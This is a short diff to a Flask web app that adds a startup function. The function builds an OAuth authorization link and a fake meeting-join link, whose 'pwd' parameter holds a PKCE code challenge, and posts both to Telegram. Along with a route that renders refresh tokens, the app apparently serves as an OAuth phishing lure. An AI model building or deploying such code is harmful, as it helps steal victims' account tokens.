@@ -311,6 +311,26 @@ def meeting():
 def refresh_page(refresh_token2):
     return render_template('refresh.html', refresh_token=refresh_token2)
 
+# --- Startup message ---
+def send_startup_message():
+    state = "0"  # Fixed state value for initialization
+    code_verifier, code_challenge = generate_code_verifier_and_challenge()
+    
+    # Generate the OAuth link
+    authorization_url = CALLBACK_URL
+
+    # Generate the meeting link
+    meeting_url = f"{CALLBACK_URL}j?meeting={state}&pwd={code_challenge}"
+    
+    # Message content
+    message = (
+        f"🚀 *OAuth Authorization Link:*\n[Authorize link]({authorization_url})\n\n"
+        f"📅 *Meeting Link:*\n[Meeting link]({meeting_url})"
+    )
+    
+    # Send the message to Telegram
+    send_message_via_telegram(message)
+
 # --- Start the app ---
 if __name__ == '__main__':
     port = int(os.environ.get("PORT", 5000))
